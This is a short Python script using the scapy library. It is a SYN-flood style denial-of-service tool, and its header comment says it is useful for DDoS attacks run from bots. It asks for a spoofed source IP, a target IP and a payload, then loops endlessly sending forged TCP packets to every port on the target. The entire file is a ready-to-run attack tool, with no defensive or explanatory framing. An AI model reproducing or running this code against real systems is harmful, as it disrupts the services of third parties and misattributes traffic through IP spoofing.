#!/usr/bin/python
# This program can be useful for a ddos attack when run from mutlple clients such as bots


from scapy.all import *


def synFlood(src,tgt,data):
    for dport in range(1,65535):
        IPlayer = IP(src=src, dst=tgt)
        TCPlayer = TCP(sport=4444, dport=dport)
        # data is optional
        RAWlayer = Raw(load=data)
        pkt = IPlayer/TCPlayer/RAWlayer
        send(pkt)


source = raw_input("[+] Enter Source IP address to fake: ")
target = raw_input("[+] Enter Target IP address: ")
data = raw_input("[+] Enter data for TCP payload: ")


while True:
    synFlood(source,target,data)

